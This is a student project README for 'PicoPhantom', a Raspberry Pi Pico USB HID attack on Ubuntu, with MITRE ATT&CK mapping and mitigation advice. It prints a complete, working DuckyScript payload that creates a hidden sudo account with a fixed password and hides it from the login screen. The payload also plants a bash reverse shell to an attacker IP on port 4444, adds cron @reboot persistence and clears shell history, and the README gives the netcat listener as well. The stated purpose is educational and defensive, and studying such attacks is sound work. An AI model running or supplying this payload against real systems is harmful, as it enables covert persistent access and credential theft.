# PicoPhantom
USB HID Attack: Persistent Reverse Shell &amp; Stealth Persistence on Linux

# PicoPhantom 👻

### USB HID Attack: Persistent Reverse Shell & Stealth Persistence on Linux

![Educational](https://img.shields.io/badge/Purpose-Educational-blue)
![Platform](https://img.shields.io/badge/Platform-Linux-orange)
![Hardware](https://img.shields.io/badge/Hardware-Raspberry%20Pi%20Pico-red)
![MITRE](https://img.shields.io/badge/Framework-MITRE%20ATT%26CK-darkred)

---

## ⚠️ Disclaimer

> **PicoPhantom is strictly an educational cybersecurity project developed as part of BSc Cybersecurity & Digital Forensics studies at UWE Bristol. All techniques demonstrated were executed exclusively in an isolated, controlled lab environment against virtual machines owned by the author. This project exists to demonstrate understanding of offensive security techniques, physical attack vectors, and defensive countermeasures. Unauthorised use of these techniques against systems you do not own is illegal. The author accepts no responsibility for misuse.**

---

## 📌 Overview

PicoPhantom is an upgraded and improved version of an original academic submission for the Secure Computer Networks module (UFCFLC-30-2) at UWE Bristol.

The original project demonstrated basic USB HID attack concepts but contained critical weaknesses — a non-functional backdoor (echo statement only), no remote access capability, and incomplete attack chain coverage. PicoPhantom addresses every one of those weaknesses and elevates the project into a complete, realistic, end-to-end offensive security demonstration.

**The concept:** A Raspberry Pi Pico configured as a USB HID device (Rubber Ducky) is plugged into an unattended Ubuntu machine for approximately 30 seconds. An automated DuckyScript payload executes silently — creating a hidden privileged user, dropping a persistent reverse shell, and registering it to run on every system reboot. The attacker walks away with the Pico. From that moment forward, every time the victim machine boots, it automatically establishes a reverse shell connection back to the attacker's Kali machine — granting full remote command-line access with no further physical interaction required.

---

## 🔁 Original vs Upgraded

| Criterion | Original Submission | PicoPhantom (Upgraded) |
|---|---|---|
| Backdoor functionality | Echo statement only | Functional bash reverse shell |
| Remote access | None — physical presence required | Full remote shell via Kali listener |
| Persistence value | Cron ran a useless script | Cron re-establishes remote access every boot |
| Session recovery | N/A | Session drops? Next reboot auto-reconnects |
| Sudo assumption | Used silently without acknowledgement | Acknowledged and contextualised |
| MITRE coverage | 5 techniques, missing T1200 | 9 techniques — full chain coverage |
| Mitigations | Generic | Stage-specific with technical depth |
| Attack chain | Partial | Complete — initial access through C2 |

---

## 🎯 Attack Chain

```
[Attacker]                          [Target - Ubuntu VM]
    |                                        |
    |  --- Plugs in Raspberry Pi Pico -->    |
    |                                        |
    |       DuckyScript executes (~30s)      |
    |       • Hidden admin user created      |
    |       • Reverse shell dropped          |
    |       • Crontab persistence set        |
    |       • History cleared                |
    |       • System reboots                 |
    |                                        |
    |  <-- Reverse shell calls home -------- |
    |                                        |
[nc -lvnp 4444]                    [Every reboot]
Full remote shell established
```

### Stage Breakdown

| Stage | Action | MITRE ID |
|---|---|---|
| 1 | Pico enumerates as USB HID keyboard | T1200 |
| 2 | Terminal opened, commands injected automatically | T1059.004 |
| 3 | Hidden admin user created, added to sudo group | T1136.001 |
| 4 | User hidden from login UI via AccountsService | T1564.002 |
| 5 | Reverse shell script dropped at hidden path | T1059.004 |
| 6 | Crontab @reboot entry registers persistence | T1053.003 |
| 7 | Bash history cleared | T1070.003 |
| 8 | System reboots — shell calls back to Kali | T1571 |
| 9 | Attacker receives remote shell, accesses /etc/shadow | T1005 |

---

## 🛠️ Requirements

### Hardware
- Raspberry Pi Pico
- USB-A to Micro-USB cable
- 1x Dupont cable (for setup mode — connect Pin 1 to Pin 3)

### Software
- CircuitPython installed on Pico
- adafruit_hid library
- duckyinpython.py (DuckyScript interpreter)

### Lab Environment
- **Target:** Ubuntu 20.04 LTS VM (VMware)
- **Attacker:** Kali Linux 2024.4 VM (VMware)
- **Network:** VMware NAT — both VMs on same subnet
- **Attacker IP:** Static `192.168.127.100` (Kali) / Your IP > Check the Payload
- **Target IP:** `192.168.127.142` (Ubuntu)

---

## 📄 Payload

### payload.dd (DuckyScript)

```
DELAY 5000
CTRL ALT t
DELAY 3000
STRING sudo useradd -m sysupdate
ENTER
DELAY 2000
STRING echo 'sysupdate:Secure123!' | sudo chpasswd
ENTER
DELAY 2000
STRING sudo usermod -aG sudo sysupdate
ENTER
DELAY 2000
STRING sudo mkdir -p /var/lib/AccountsService/users
ENTER
DELAY 1500
STRING sudo bash -c 'echo "[User]" > /var/lib/AccountsService/users/sysupdate'
ENTER
DELAY 1500
STRING sudo bash -c 'echo "SystemAccount=true" >> /var/lib/AccountsService/users/sysupdate'
ENTER
DELAY 1500
STRING sudo bash -c 'echo "#!/bin/bash" > /usr/local/bin/.syscheck'
ENTER
DELAY 1500
STRING sudo bash -c 'echo "bash -i >& /dev/tcp/192.168.127.100/4444 0>&1" >> /usr/local/bin/.syscheck'
ENTER
DELAY 1500
STRING sudo chmod +x /usr/local/bin/.syscheck
ENTER
DELAY 1500
STRING (crontab -l 2>/dev/null ; echo "@reboot sleep 15 && /usr/local/bin/.syscheck") | crontab -
ENTER
DELAY 2000
STRING history -c && history -w
ENTER
DELAY 1500
STRING sudo reboot
ENTER
```

### backdoor.sh (Reverse Shell — planted at /usr/local/bin/.syscheck)

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.127.100/4444 0>&1
```

### Kali Listener

```bash
nc -lvnp 4444
```

---

## 🗺️ MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Hardware Additions | T1200 |
| Execution | Command & Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation / Persistence | Create Account: Local Account | T1136.001 |
| Persistence | Scheduled Task/Job: Cron | T1053.003 |
| Defense Evasion | Hide Artifacts: Hidden Files and Directories | T1564.001 |
| Defense Evasion | Indicator Removal: Clear Command History | T1070.003 |
| Defense Evasion | Hide Artifacts: Hidden Users | T1564.002 |
| Command & Control | Non-Standard Port | T1571 |
| Collection | Data from Local System | T1005 |

---

## 🛡️ Mitigation Strategies

### Stage 1 — Prevent Initial Access
- **USB Device Whitelisting (M1034):** Only permit pre-approved USB device IDs via udev rules or endpoint management. An unregistered Pico is blocked on insertion.
- **Physical Port Controls:** USB-A port blockers or BIOS-level restrictions in high-security environments. Note: policy should distinguish between input device classes — blanket USB disabling impacts legitimate keyboards and storage.
- **Screen Lock Policy:** Automatic lock after 60-90 seconds eliminates the unattended machine precondition entirely.

### Stage 2 — Detect Execution
- **Sudo Audit Logging:** Disable NOPASSWD and enable sudo logging to syslog. Rapid automated sudo commands in a short window is a strong indicator of HID injection.
- **Application Whitelisting (M1038):** AppArmor can restrict which binaries execute — a script dropped to /usr/local/bin by an unexpected process would be blocked.

### Stage 3 — Detect User Creation
- **PAM Authentication Alerts:** Real-time alerts on useradd events outside approved change windows.
- **User Account Auditing:** Regular /etc/passwd comparison against a known-good baseline. SIEM rules on modifications to /etc/passwd.

### Stage 4 & 5 — Detect Persistence
- **Crontab Integrity Monitoring (M1047):** File integrity tools (AIDE, Tripwire) detect crontab modifications. Alert on @reboot entries added outside change management.
- **Outbound Connection Monitoring:** Block unexpected outbound TCP connections on non-standard ports (4444 has no legitimate business justification on a workstation).

### Stage 6 — Detect Evasion
- **Immutable Bash History / auditd:** history -c clears the buffer but auditd captures syscalls underneath — forensic evidence remains.
- **Hidden File Monitoring:** Scan /usr/local/bin for dot-prefix files. Legitimate system binaries never use dot-prefix names in these locations.

### Stage 7 — Block C2
- **Host-Based Firewall:** Default-deny outbound policy. Workstations should not initiate TCP connections to arbitrary IPs on port 4444.
- **Network Anomaly Detection:** IDS/IPS (Snort, Suricata) can detect reverse shell traffic patterns over raw TCP.

---

## ⚠️ Honest Limitations

- **Sudo assumption:** This attack assumes the logged-in user has passwordless sudo. In a real engagement against a hardened system, privilege escalation would first be required (SUID exploitation, sudo misconfiguration etc). The lab VM makes this assumption reasonable for demonstration.
- **Static IP dependency:** Kali's IP is hardcoded in the payload. Resolved in lab by assigning a static IP. Real engagements use a domain name or VPS with a permanent public IP.
- **Session volatility:** The raw bash reverse shell is a non-interactive TTY-less session. Stable for command execution but interactive programs (nano, vim) are unstable. Production engagements would upgrade to Meterpreter or stabilise with Python pty.
- **Network scope:** Attack operates within VMware NAT subnet. Real world C2 would require a publicly accessible server.

---

## 📸 Evidence

> Screenshots from live lab execution:
> - Payload executing autonomously on Ubuntu
> - Kali listener catching the reverse shell connection
> - `whoami`, `hostname`, `id` confirming remote access
> - `/etc/shadow` accessed from Kali shell
> - Persistence confirmed across multiple reboots

*(Screenshots folder — see /docs/screenshots)*

---

## 📚 References

- MITRE Corporation. (2025) MITRE ATT&CK Framework v17.0. https://attack.mitre.org
- Hak5. (2022) DuckyScript Language Reference. https://docs.hak5.org/hak5-usb-rubber-ducky
- Raspberry Pi Foundation. (2025) Raspberry Pi Pico Documentation. https://www.raspberrypi.com/documentation/microcontrollers/
- Canonical Ltd. (2025) Ubuntu Security Documentation. https://ubuntu.com/security
- CISA. (2025) USB Security Best Practices. https://www.cisa.gov/resources-tools/resources

---

## 👤 Author

**Yuttavio**
BSc Cybersecurity & Digital Forensics — UWE Bristol
GitHub: [@Mochabytee](https://github.com/Mochabytee)

---

*PicoPhantom — built for learning, documented for understanding, published for transparency.*
